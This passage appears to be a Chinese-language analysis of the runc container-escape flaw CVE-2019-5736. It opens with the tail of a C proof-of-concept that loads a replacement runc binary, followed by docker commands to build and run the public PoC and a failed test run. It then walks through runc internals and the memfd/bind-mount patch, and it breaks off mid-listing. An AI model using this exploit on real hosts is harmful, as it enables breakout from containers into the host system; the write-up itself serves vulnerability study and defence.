Done, shuting down ...\\n\");\n\n    fflush(stdout);\n    return RET_OK;\n}\n\n\n/*\n* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.\n*/\nBuffer read_new_runc(char * new_runc_path)\n{\n    Buffer new_runc = {0, NULL};\n    FILE *fp_new_runc;\n    int file_size, rc;\n    void * new_runc_content;\n    char ch;\n\n\n    // open new_Runc\n    fp_new_runc = fopen(new_runc_path, \"r\"); // read mode\n    if (fp_new_runc == NULL)\n    {\n      printf(\"[!] open file err while opening the new runc file %s\\n\", new_runc_path);\n      return new_runc;\n    }\n\n\n    // Get file size and prepare buff\n    fseek(fp_new_runc, 0L, SEEK_END);\n    file_size = ftell(fp_new_runc);\n    new_runc_content = malloc(file_size);\n    rewind(fp_new_runc);\n\n\n    rc = fread(new_runc_content, 1, file_size, fp_new_runc);\n    if (rc != file_size)\n    {\n        printf(\"[!] Couldn't read from new runc file at %s\\n\", new_runc_path);\n        free(new_runc_content);\n        return new_runc;\n    }\n\n\n    fclose(fp_new_runc);\n    new_runc.len = rc;\n    new_runc.buff = new_runc_content;\n    return new_runc;\n\n\n}\n\n\n\n\n\n\u4f7f\u7528\uff1a\n\n\n$ git clone https://github.com/twistlock/RunC-CVE-2019-5736\n\n$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC\n$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC\n$ docker exec poc_ctr bash\n\n\n\n\n\n\u5b9e\u9645\u6d4b\u8bd5\uff1a\n\n\n# docker run --rm --name poc_ctr cve-2019-5736:exec_POC\n[+] Waiting for runC to be executed in the container...\n[!] Open: No such file or directory\n[!] Couldn't open runC's exe /proc/2851/exe\n\n\n\n\n\nrunc\u539f\u7406\u5206\u6790\n\n\nrunc run\n\n\nrunc\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\u7684\u547d\u4ee4\u662f\uff1arunc run\uff0c\u5b83\u4ee3\u7801\u6d41\u7a0b\u76f8\u5f53\u4e8e\u4f9d\u6b21\u6267\u884crunc create\u548crunc start\u547d\u4ee4\u3002  \n\n\n\u9996\u5148\u6839\u636e\u914d\u7f6e\u6587\u4ef6config.json\u521b\u5efa\u5bb9\u5668\u5bf9\u8c61linuxContainer\uff0c\u5176\u4e2d\u5305\u542b\u4e86namespace\u3001cgroups\u3001device\u548cmountpoint\u7b49\u5404\u79cd\u914d\u7f6e\u4fe1\u606f;  \n\n\n\u7136\u540e\u901a\u8fc7\u521b\u5efa\u5b50\u8fdb\u7a0b\u7684\u65b9\u5f0f\u6267\u884c runc init\uff0crunc init\u8fdb\u884c\u4e00\u7cfb\u5217\u521d\u59cb\u5316\u540e( \u6bd4\u5982\u521b\u5efa\u5bb9\u5668\u6587\u4ef6\u7cfb\u7edf\uff0c\u52a0\u5165\u548c\u914d\u7f6e\u547d\u540d\u7a7a\u95f4)\uff0c\u8c03\u7528 execve syscall \u5c06\u81ea\u5df1\u53d8\u6210\u9700\u8981\u6267\u884c\u7684\u5bb9\u5668\u8fdb\u7a0b;  \n\n\n\u5728\u6b64\u4e4b\u524d\uff0c\u4f1a\u5148\u901a\u8fc7\u5199\u5165\u547d\u540d\u7ba1\u9053exec.fifo\u963b\u585e\uff0c\u7b49\u5f85\u76f4\u81f3runc start\u547d\u4ee4\u6267\u884c\uff0c\u8bfb\u53d6exec.fifo\u7684\u5185\u5bb9\u3002\n\n\n\u5bb9\u5668\u521b\u5efa\n\n\n\u5bb9\u5668\u521b\u5efa\u4e3b\u8981\u5de5\u4f5c\u662f\u5c06OCI\u683c\u5f0f\u7684\u914d\u7f6e\u6587\u4ef6config.json\u52a0\u8f7d\u5230\u5185\u5b58linuxContainer\u7ed3\u6784\u4f53\u4e2d\n\n\ntype linuxContainer struct {\n    id                   string\n    root                 string\n    config               *configs.Config\n    cgroupManager        cgroups.Manager\n    intelRdtManager      intelrdt.Manager\n    initPath             string\n    initArgs             []string\n    initProcess          parentProcess\n    initProcessStartTime uint64\n    criuPath             string\n    newuidmapPath        string\n    newgidmapPath        string\n    m                    sync.Mutex\n    criuVersion          int\n    state                containerState\n    created              time.Time\n}\n\n\n\n\n\n\u7ed3\u6784\u4f53initProcess\u4fdd\u5b58\u4e86\u521b\u5efa\u5bb9\u5668\u521d\u59cb\u5316\u8fdb\u7a0b(runc init)\u7684\u76f8\u5173\u4fe1\u606f:\n\n\ntype initProcess struct {\n    cmd             *exec.Cmd\n    messageSockPair filePair\n    logFilePair     filePair\n    config          *initConfig\n    manager         cgroups.Manager\n    intelRdtManager intelrdt.Manager\n    container       *linuxContainer\n    fds             []string\n    process         *Process\n    bootstrapData   io.Reader\n    sharePidns      bool\n}\n\n\n\n\n\u521b\u5efa\u5bb9\u5668\u65f6\uff0c\u8bbe\u7f6e\u4e86\u5b50\u8fdb\u7a0b\u7684path\u548c\u53c2\u6570\uff1a\n/proc/self/exe init\n \u5373 \nrunc init\n  \n\n\n// runc/libcontainer/factory_linux.go -> New()\n\nfunc New(root string, options ...func(*LinuxFactory) error) (Factory, error) {\n    // ...\n    l := &LinuxFactory{\n        Root:      root,\n        InitPath:  \"/proc/self/exe\",\n        InitArgs:  []string{os.Args[0], \"init\"},\n        Validator: validate.New(),\n        CriuPath:  \"criu\",\n    }\n    // ...\n    return l, nil\n}\n\n\n\n\n\n// runc/libcontainer/process_linux.go -> start()\n\nfunc (p *initProcess) start() (retErr error) {\n  ...\n  err := p.cmd.Start()\n  ...\n\n  // Wait for our first child to exit\n  if err := p.waitForChildExit(childPid); err != nil {\n\n  // ...\n  p.sendConfig()\n\n  // ...\n  parseSync(p.messageSockPair.parent, func(sync *syncT) error {\n    switch sync.Type {\n        case procReady:\n        // ...\n        writeSync(p.messageSockPair.parent, procRun)\n    case procHooks:\n        writeSync(p.messageSockPair.parent, procResume)\n\n}\n\n\n\n\n\np.cmd.Start()\u662f\u4f7f\u7528\u7684go\u7684package exec\uff0c\u542f\u52a8\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002  \n\n\n\u6267\u884c\u5b50\u8fdb\u7a0b\u9700\u8981\u7684\u547d\u4ee4\u884c\u914d\u7f6e\u5728commandTemplate\u4e2d\u8bbe\u7f6e\n\n\n// runc/libcontainer/container_linux.go -> commandTemplate()\n\nfunc (c *linuxContainer) commandTemplate(p *Process, childInitPipe *os.File, childLogPipe *os.File) *exec.Cmd {\n    cmd := exec.Command(c.initPath, c.initArgs[1:]...)\n    cmd.Args[0] = c.initArgs[0]\n    cmd.Stdin = p.Stdin\n    cmd.Stdout = p.Stdout\n    cmd.Stderr = p.Stderr\n    cmd.Dir = c.config.Rootfs\n\n    if cmd.SysProcAttr == nil {\n        cmd.SysProcAttr = &syscall.SysProcAttr{}\n    }\n\n  cmd.Env = append(cmd.Env, fmt.Sprintf(\"GOMAXPROCS=%s\", os.Getenv(\"GOMAXPROCS\")))\n    cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...)\n    if p.ConsoleSocket != nil {\n        cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket)\n        cmd.Env = append(cmd.Env,\n            fmt.Sprintf(\"_LIBCONTAINER_CONSOLE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        )\n    }\n    cmd.ExtraFiles = append(cmd.ExtraFiles, childInitPipe)\n    cmd.Env = append(cmd.Env\n        fmt.Sprintf(\"_LIBCONTAINER_INITPIPE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        fmt.Sprintf(\"_LIBCONTAINER_STATEDIR=%s\", c.root),\n    )\n\n\n    cmd.ExtraFiles = append(cmd.ExtraFiles, childLogPipe)\n    cmd.Env = append(cmd.Env,\n        fmt.Sprintf(\"_LIBCONTAINER_LOGPIPE=%d\", stdioFdCount+len(cmd.ExtraFiles)-1),\n        fmt.Sprintf(\"_LIBCONTAINER_LOGLEVEL=%s\", p.LogLevel),\n    )\n  // ...\n\n\n  return c\n}\n\n\n\n\n\n\u5bb9\u5668\u521d\u59cb\u5316\n\n\n\u5bb9\u5668\u521d\u59cb\u5316\u901a\u8fc7\nrunc init\n\u5b8c\u6210\uff0c\u53ef\u4ee5\u8bf4\u5bb9\u5668\u8fdb\u7a0b\u533a\u522b\u4e8e\u6b63\u5e38\u7cfb\u7edf\u8fdb\u7a0b\u7684\u6838\u5fc3\u8981\u7d20\u90fd\u662f\u901a\u8fc7\nrunc init\n\u6765\u5b9e\u73b0\u3002\n\n\u5b83\u9996\u5148\u5bf9\u5f53\u524d\u8fdb\u7a0b\u5b8c\u6210\u5bb9\u5668\u8fdb\u7a0b\u9700\u8981\u7684\u5404\u79cd\u9650\u5236\u548c\u9694\u79bb\uff0c\u7136\u540e\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528execve\u5c06\u81ea\u5df1\u53d8\u6210\u9700\u8981\u6267\u884c\u7684\u8fdb\u7a0b\u3002\n\n\n// runc/init.go\n\npackage main\n\n\nimport (\n    // ...\n    _ \"github.com/opencontainers/runc/libcontainer/nsenter\"\n    // ...\n)\n\n// ...\nvar initCommand = cli.Command{\n    Name:  \"init\",\n    Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`,\n  // ...\n    Action: func(context *cli.Context) error {\n        factory, _ := libcontainer.New(\"\")\n        if err := factory.StartInitialization(); err != nil {\n        // ...\n    },\n}\n\n\n\n\n\n// runc/libcontainer/ nsenter/nsexec.c -> nsexec()\n\nvoid nsexec(void)\n{\n  // ...\n  case JUMP_CHILD:{\n    //...\n    if (config.namespaces)\n     join_namespaces(config.namespaces);\n\n    if (config.cloneflags & CLONE_NEWUSER) {\n     if (unshare(CLONE_NEWUSER) < 0)\n      bail(\"failed to unshare user namespace\");\n     config.cloneflags &= ~CLONE_NEWUSER;\n\n    if (unshare(config.cloneflags & ~CLONE_NEWCGROUP) < 0)\n      bail(\"failed to unshare namespaces\");\n    // ...\n    }\n}\n\n\n\n\n\n\n\u5bb9\u5668\u521d\u59cb\u5316\u5de5\u4f5c\u5728\u8fd9\u91cc\u5b8c\u6210\uff0c\u6700\u540e\u963b\u585e\u5728write exec.fifo\uff0c\u7b49\u5f85\u5bb9\u5668\u542f\u52a8\n\n\n// runc/libcontainer/standard_init_linux.go ->  Init()\n\nfunc (l *linuxStandardInit) Init() error {   \n  ... \n  setupNetwork(l.config)\n  ...\n  setupRoute(l.config.Config)\n  ...\n  prepareRootfs(l.pipe, l.config)\n  ...\n  finalizeRootfs(l.config.Config)\n  ...\n  syncParentReady(l.pipe)\n  ... \n  seccomp.InitSeccomp(l.config.Config.Seccomp)\n  ...\n  finalizeNamespace(l.config)\n  ...\n  name, err := exec.LookPath(l.config.Args[0])\n  ...\n  fd, err := unix.Open(fmt.Sprintf(\"/proc/self/fd/%d\", l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0)\n  ...\n  if _, err := unix.Write(fd, []byte(\"0\")); err != nil {\n  ...\n  syscall.Exec(name, l.config.Args[0:], os.Environ())\n  ...\n}\n\n\n\n\n\n\ninit.go\u5bfc\u5165\u7684package nsenter\u662f\u505a\u4ec0\u4e48\u7684\uff1f\n\n\n$ cat README.md\nThe `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  \n\nThis provides us the ability to `setns` on existing namespaces \nand avoid the issues that the Go runtime has with multiple \nthreads.  \n\nThis constructor will be called if this package is registered, \nimported, in your go application.\n\n\n\n\n\n\n\n\u5bf9\u4e8eMount Namespace\u6765\u8bf4\uff0c\u4e00\u4e2a\u5177\u6709\u591a\u7ebf\u7a0b\u7684\u8fdb\u7a0b\u662f\u65e0\u6cd5\u4f7f\u7528setns\u8c03\u7528\u8fdb\u5165\u5230\u5bf9\u5e94\u7684\u547d\u540d\u7a7a\u95f4( the Go runtime has with multiple threads )\u3002\n\n\n\u6240\u4ee5\u901a\u8fc7CGO(CGO\u4ecb\u7ecd\u89c1\u4e0b\u6587)\u5728Go runtime \u542f\u52a8\u4e4b\u524d\uff0c\u6267\u884c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4e5f\u5c31\u662fnsexec.c\u4e2d\u7684nsexec\u51fd\u6570\u6765\u8fdb\u884csetns\u64cd\u4f5c\u3002\n\n\n\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u4f1a\u5728nsenter package \u88ab\u5bfc\u5165\u7684\u65f6\u5019\u6267\u884c\u3002\n\n\n\n\npackage nsenter\u7684\u4e3b\u8981\u5185\u5bb9\n\n\n$ pwd\n.../runc-master/libcontainer/nsenter\n$ tree\n.\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 cloned_binary.c\n\u251c\u2500\u2500 namespace.h\n\u251c\u2500\u2500 nsenter.go\n\u251c\u2500\u2500 nsenter_gccgo.go\n\u251c\u2500\u2500 nsenter_test.go\n\u251c\u2500\u2500 nsenter_unsupported.go\n\u2514\u2500\u2500 nsexec.c\n\n0 directories, 8 files\n\n\n\n\n\n$ cat nsenter.go\n// +build linux,!gccgo\n\npackage nsenter\n\n/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n    nsexec();\n}\n*/\nimport \"C\"\n\n\n\n\n\n\u8fd9\u91cc\u7528\u5230\u4e86CGO\uff1a\n\n\n$ cat README.md\n...\nThe `nsenter` package will `import \"C\"` and it uses [cgo](https://golang.org/cmd/cgo/) package. \n\nIn cgo, if the import of \"C\" is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.\n...\n\n\n\n\n\nCGO\u7b80\u5355\u8bf4\u5c31\u662f: \u901a\u8fc7go\u8c03\u7528C\u8bed\u8a00\u4ee3\u7801\uff0c\u8bed\u6cd5\u662f import \"C\"\u8bed\u53e5+\u524d\u9762\u7684\u6ce8\u91ca(\u79f0\u4e3apreamble)\uff0cpreamble\u90e8\u5206\u5c31\u662fC\u8bed\u8a00\u4ee3\u7801(\u5f53C\u4ee3\u7801\u5728\u4e0d\u540c\u6587\u4ef6\u65f6\uff0cpreamble\u53ef\u4ee5\u53ea\u5199\u5934\u6587\u4ef6\u5f15\u7528)\u3002\n\u5177\u4f53\u53c2\u8003\uff1a\n\nhttps://golang.org/cmd/cgo/\n\n\nhttps://bastengao.com/blog/2017/12/go-cgo-c.html\n\n\n\u4e0a\u9762\u7684\u4ee3\u7801\u5dee\u4e0d\u591a\u662f\u8fd9\u6837\u7684\u6548\u679c\uff1a\n\n\n$ tree\n.\n\u251c\u2500\u2500 cgo_c.c\n\u2514\u2500\u2500 cgo_example.go\n\n0 directories, 2 files\n\n$ cat cgo_c.c\n#include <stdio.h>\n\nvoid c_func1(){\n    printf(\"Hello, CGO!\\n\");\n}\n\nvoid c_func2(){\n    printf(\"Goodbye, CGO!\\n\");\n}\n\n$ cat cgo_example.go\npackage main\n\n/*\nextern void c_func1();\nextern void c_func2();\n\nvoid __attribute__((constructor)) init(void) {\n    c_func1();\n}\n\n*/\nimport \"C\"\n\nfunc main(){\n    C.c_func2()\n}\n\n$ go build -o cgo\n$ ./cgo\nHello, CGO!\nGoodbye, CGO!\n\n\n\n\n\n\n\u5173\u4e8e\n__attribute__((constructor))\n: \u5b83\u662f\u4e00\u4e2a\u9762\u5411gcc\u7684\u7279\u6027\uff0c\u529f\u80fd\u662f\u8bbe\u7f6e\u4e00\u4e2a\u5728main\u51fd\u6570\u6267\u884c\u524d\u6267\u884c\u7684\u6784\u9020\u51fd\u6570\u3002\n\n\n\u5bb9\u5668\u542f\u52a8\n\n\n\u4e3b\u8981\u505a\u7684\u5c31\u662f\u8bfb\u53d6exec.fifo\u6570\u636e\uff0c\u8ba9\nrunc init\n\u7ee7\u7eed\u6267\u884c\n\n\n// runc/libcontainer/container_linux.go -> exec()\n\nfunc (c *linuxContainer) exec() error {\n    path := filepath.Join(c.root, execFifoFilename)\n    pid := c.initProcess.pid()\n    blockingFifoOpenCh := awaitFifoOpen(path)\n    // ... \n    return handleFifoResult(result)\n    // ...\n}\n\n\n\n\n\n// runc/libcontainer/container_linux.go  -> handleFifoResult()\n\nfunc handleFifoResult(result openResult) error {\n   // ...\n   f := result.file\n   readFromExecFifo(f)\n   // ...\n   return os.Remove(f.Name())\n}\n\n\n\n\n\nrunc exec\n\n\nrunc\u6267\u884c\u4e00\u4e2a\u5bb9\u5668\u8fdb\u7a0b\u7684\u547d\u4ee4\u662f: \nrunc exec\n\uff0c\u5b83\u548c\nrunc run\n\u7684\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4f46\u4e0d\u4f1a\u521b\u5efa\u65b0\u5bb9\u5668\uff0c\u800c\u662f\u901a\u8fc7id\u83b7\u53d6\u5df2\u7ecf\u521b\u5efa\u7684\u5bb9\u5668\uff0c\u4e4b\u540e\u4e5f\u4f1a\u901a\u8fc7\u521b\u5efa\nrunc init\n\u8fdb\u7a0b\u5bf9\u5bb9\u5668\u8fdb\u7a0b\u521d\u59cb\u5316\uff0c\u7136\u540e\u901a\u8fc7\nsyscall execve\n\u5c06\u81ea\u5df1\u66ff\u6362\u6210\u8981\u6267\u884c\u7684\u5bb9\u5668\u8fdb\u7a0b\u3002\n\n\n\u8865\u4e01\u5206\u6790\n\n\n\u8865\u4e01\u6982\u8ff0\n\n\n\u7b80\u5355\u603b\u7ed3\u5c31\u662f\uff1a\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0fclone\u4e00\u4e2arunc\u7684\n/proc/self/exe\n\u7684\u53ea\u8bfb\u526f\u672c\uff0c\u8be5\u526f\u672c\u662f\u4e00\u4e2a\u53ea\u8bfb\u7684\u5185\u5b58\u6587\u4ef6\uff0c\u7136\u540e\u91cd\u65b0\u6267\u884cclone\u51fa\u7684\u5185\u5b58\u6587\u4ef6\uff0c\u4ece\u800c\u4f7frunc\u8fdb\u7a0b\u7684proc\u7b26\u53f7\u94fe\u63a5(\n/proc/self/exe\n)\u5bf9\u5e94\u7684\u662f\u8be5\u5185\u5b58\u6587\u4ef6\u526f\u672c\u3002\n\n\n\u4e3a\u4e86\u4fee\u590d\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u5728runc\u6e90\u7801\nlibcontainer/nsenter/nsexec.c\n\u00a0\u6587\u4ef6\u7684\nnsexec\n\u51fd\u6570\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a\nensure_cloned_binary\n\u51fd\u6570\u8c03\u7528\uff1a\n\n\nif (ensure_cloned_binary() < 0)\n        bail(\"could not ensure we are a cloned binary\");\n\n\n\n\n\u5b83\u7684\u5b9e\u73b0\u5728\u6587\u4ef6\nlibcontainer/nsenter/cloned_binary.c\n\u00a0\u4e2d\uff1a\n\n\nint ensure_cloned_binary(void)\n{\n   int execfd;\n   ...\n   int cloned = is_self_cloned();\n\n   if (cloned > 0 || cloned == -ENOTRECOVERABLE)\n     return cloned;\n   ...\n   execfd = clone_binary();\n   ...\n   fexecve(execfd, argv, environ);\n   ...\n}\n\n\n\n\n\n\n\nensure_cloned_binary\u51fd\u6570\u9996\u5148\u901a\u8fc7is_self_cloned\u51fd\u6570\u5224\u65ad\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u662fcloned(\u8fd9\u91cc\u7684clone\u53ef\u4ee5\u7406\u89e3\u6210\u590d\u5236\u6587\u4ef6\uff0c\u800c\u4e0d\u662fclone\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7684\u90a3\u4e2aclone)\uff1b\n\n\n\u5982\u679crunc\u662f\u7b2c\u4e00\u6b21\u88ab\u6267\u884c\uff0c\u5219\u4f1a\u8fd4\u56defalse\uff0c\u7136\u540e\u901a\u8fc7clone_binary\u51fd\u6570\u590d\u5236/proc/self/exe\u6587\u4ef6\uff1b\n\n\n\u6700\u540e\u901a\u8fc7fexecve\u91cd\u65b0\u542f\u52a8\u5f53\u524d\u8fdb\u7a0b\uff0c\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6\u662f\u590d\u5236\u540e\u7684\u6587\u4ef6\uff1b\n\n\n\u4e0b\u4e00\u6b21\u6267\u884c\u7684\u65f6\u5019\uff0cis_self_cloned\u51fd\u6570\u4f1a\u8fd4\u56detrue\uff0c\u7136\u540e\u8fdb\u5165\u6253\u8865\u4e01\u524d\u7684\u6b63\u5e38\u6d41\u7a0b\u3002\n\n\n\n\nensure_cloned_binary->is_self_cloned\n\n\nis_self_cloned\u662f\u5982\u4f55\u5224\u65ad\u5f53\u524d\u6587\u4ef6\u662f\u5426\u662fclone\u8fc7\u7684\uff1f\n\n\n#define RUNC_MEMFD_SEALS \\\n    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)\n\n\n#ifndef F_SEAL_SEAL\n#  define F_SEAL_SEAL   0x0001  /* prevent further seals from being set */\n#  define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */\n#  define F_SEAL_GROW   0x0004  /* prevent file from growing */\n#  define F_SEAL_WRITE  0x0008  /* prevent writes */\n#endif\n\n\nstatic int is_self_cloned(void)\n{\n    int fd, ret, is_cloned = 0;\n    struct stat statbuf = {};\n    struct statfs fsbuf = {};\n\n\n    fd = open(\"/proc/self/exe\", O_RDONLY|O_CLOEXEC);\n    if (fd < 0)\n        return -ENOTRECOVERABLE;\n\n\n    /*\n     * Is the binary a fully-sealed memfd? We don't need CLONED_BINARY_ENV for\n     * this, because you cannot write to a sealed memfd no matter what (so\n     * sharing it isn't a bad thing -- and an admin could bind-mount a sealed\n     * memfd to /usr/bin/runc to allow re-use).\n     */\n  // \u901a\u8fc7\u83b7\u53d6\u6587\u4ef6\u7684SEALS\u5224\u65ad\uff0c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e0d\u662f\u8bbe\u7f6e\u8fc7SEALS(\u53ea\u8bfb\uff0c\u5927\u5c0f\u4e0d\u53ef\u6539\u53d8)\u7684\u5185\u5b58\u6587\u4ef6\n  // \u5982\u679c\u662f\u901a\u8fc7make_execd\u7684memfd_create\u7684\u65b9\u5f0f\u521b\u5efa\u7684clone\u6587\u4ef6\uff0c\u5219is_clone\u4f1a\u8bbe\u7f6e\u4e3atrue\n    ret = fcntl(fd, F_GET_SEALS);\n    if (ret >= 0) {\n        is_cloned = (ret == RUNC_MEMFD_SEALS);\n        goto out;\n    }\n\n\n    // \u68c0\u67e5\u662f\u5426\u8bbe\u7f6e\u4e86CLONED_BINARY_ENV\n  // \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u4f1a\u5728\u7236\u8fdb\u7a0bensure_cloned_binary\u51fd\u6570\u4e2d\u8bbe\u7f6e\n  // \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5219\u5224\u65ad\u4e3a\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u4e0d\u662fcloned\n    if (!getenv(CLONED_BINARY_ENV)) {\n        is_cloned = false;\n        goto out;\n    }\n\n\n    /*\n     * Is the binary on a read-only filesystem? We can't detect bind-mounts in\n     * particular (in-kernel they are identical to regular mounts) but we can\n     * at least be sure that it's read-only. In addition, to make sure that\n     * it's *our* bind-mount we check CLONED_BINARY_ENV.\n     */\n  // \u5982\u679c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u5728\u4e00\u4e2a\u53ea\u8bfb\u7684filesystem\uff0c\u4e5f\u53ef\u4ee5\u5224\u65ad\u662fclone\u7684\u6587\u4ef6\n  // \u901a\u8fc7try_bindfd\u65b9\u5f0f\u521b\u5efa\u7684\u8bdd\uff0cis_cloned\u4f1a\u8bbe\u7f6e\u4e3atrue\n    if (fstatfs(fd, &fsbuf) >= 0)\n        is_cloned |= (fsbuf.f_flags & MS_RDONLY);\n\n\n    /*\n     * Okay, we're a tmpfile -- or we're currently running on RHEL <=7.6\n     * which appears to have a borked backport of F_GET_SEALS. Either way,\n     * having a file which has no hardlinks indicates that we aren't using\n     * a host-side \"runc\" binary and this is something that a container\n     * cannot fake (because unlinking requires being able to resolve the\n     * path that you want to unlink).\n     */\n  // \u5982\u679c\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709hardlinks\u4e5f\u53ef\u4ee5\u5224\u65ad\u662fclone\u7684\u4e34\u65f6\u6587\u4ef6\n    if (fstat(fd, &statbuf) >= 0)\n        is_cloned |= (statbuf.st_nlink == 0);\n\n\nout:\n    close(fd);\n    return is_cloned;\n}\n\n\n\n\n\n\nensure_cloned_binary->clone_binary\n\n\nclone_binary\u662f\u5982\u4f55\u5b9e\u73b0\u7684\uff1f  \n\n\n\u521b\u5efa\u4e00\u4e2a\u53ea\u8bfb\u7684\uff0c\u5927\u5c0f\u4e0d\u53ef\u6539\u53d8\u7684\u4e34\u65f6\u5185\u5b58\u6587\u4ef6\uff0c\u4f5c\u4e3arunc\u53ef\u6267\u884c\u6587\u4ef6\u7684clone\u3002\n\n\n\u7b2c\u4e00\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7bind mount\uff0c\u89c1try_bindfd\u90e8\u5206\n\n\nstatic int clone_binary(void)\n{\n\u00a0 \u00a0 ...\n    /*\n     * Before we resort to copying, let's try creating an ro-binfd in one shot\n     * by getting a handle for a read-only bind-mount of the execfd.\n     */\n\u00a0\u00a0\n    execfd = try_bindfd();\n    if (execfd >= 0)\n        return execfd;\n    ...\n\n\n\n\n\u7b2c\u4e8c\u79cd\u65b9\u5f0f: \u5f53try_bindfd\u5931\u8d25\u7684\u65f6\u5019\u901a\u8fc7make_execfd\u548cseal_execfd\u6765\u5b9e\u73b0clone\u65b9\u6848\u3002\n\n\n\u901a\u8fc7\nmake_exec\n\u6765\u521b\u5efa\u4e00\u4e2a\u5185\u5b58\u6587\u4ef6\uff0c\u62f7\u8d1d\n/proc/self/exe\n\u7684\u6570\u636e\u540e\uff0c\u901a\u8fc7\nseal_execfd\n\u5bf9\u8be5\u5185\u5b58\u6587\u4ef6\u8bbe\u7f6e\u9650\u5236\u4f7f\u5176\u53ea\u8bfb\u3002\u6548\u679c\u5c31\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u53ea\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\u7684\n/proc/self/exe\n\u7684\u53ea\u8bfb\u7684clone\u6587\u4ef6\u3002\n\n\n    /*\n     * Dammit, that didn't work -- time to copy the binary to a safe place we\n     * can seal the contents.\n     */\n    execfd = make_execfd(&fdtype);\n    ...\n    binfd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC);\n    ...\n    fstat(binfd, &statbuf) \n    ...\n    while (sent < statbuf.st_size) {\n        int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);\n        ...\n        sent += n;\n    }\n    close(binfd);\n    ...\n    seal_execfd(&execfd, fdtype)\n    ...\n    return execfd;\n    ...\n\n\n\n\nclone_binary->try_bindfd\n\n\n\u5c1d\u8bd5\u5c06\n/proc/self/exe\n\u901a\u8fc7bind mount\u7684\u65b9\u5f0fbind\u5230\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\n/tmp/runc.xxxxxx\n\n\nstatic int try_bindfd(void)\n{\n  ...\n\u00a0 fd = mkstemp(template);\n  ...   \n  ret = -EPERM;\n\u00a0 if (mount(\"/proc/self/exe\", template, \"\", MS_BIND, \"\") < 0)\n        goto out;\n\u00a0\u00a0\n  ...\n  if (mount(\"\", template, \"\", MS_REMOUNT | MS_BIND | MS_RDONLY, \"\") < 0)\n        goto out_umount;\n\u00a0\u00a0\n\u00a0 ...\n  ret = open(template, O_PATH | O_CLOEXEC);\nout_umount:\n    ...\n    if (umount2(template, MNT_DETACH) < 0) {\n        if (ret >= 0)\n            close(ret);\n        ret = -ENOTRECOVERABLE;\n    }\n\u00a0\u00a0\nout:\n    ...\n    unlink(template);\n    return ret;\n}\n\u00a0\u00a0\n\n\n\n\n\u4e00\u4e2a\u6d4b\u8bd5Demo:\n\n\n#define _GNU_SOURCE\n#include <sys/mount.h>\n#include <time.h>\n#include <stdio.h>\n#include <sys/types.h>\u00a0 \u00a0\n#include <sys/stat.h>\u00a0 \u00a0\u00a0\n#include <fcntl.h>\n#include <stdlib.h>\nint main(){\n    char template[1024] = \"./target.XXXXXX\";\n    int fd = mkstemp(template);\n    printf(\"%d\\n\", fd);\n    mount(\"/proc/self/exe\", template, \"\", MS_BIND, \"\") ;\n    mount(\"\", template, \"\", MS_REMOUNT | MS_BIND | MS_RDONLY, \"\");\n    int ret = open(template, O_PATH | O_CLOEXEC);\n    printf(\"%d\\n\", ret);\n    sleep(20);\n    umount2(template, MNT_DETACH);\n    printf(\"umounted\\n\");\n    sleep(1000);\n}\n\n/*\n$ sudo ./mount_umount_demo\u00a0\n3\n4\n\n$ ls -l\n...\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo\n-rw-r--r-- 1 invincible invincible\u00a0 551 Apr 14 20:39 mount_umount_demo.c\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt\n\n$ sudo ./mount_umount_demo\u00a0\n3\n4\numounted\n\n$ ls -l\n...\n-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo\n-rw-r--r-- 1 invincible invincible\u00a0 551 Apr 14 20:39 mount_umount_demo.c\n-rw------- 1 root\u00a0 \u00a0 \u00a0 \u00a0root\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 0 Apr 14 20:40 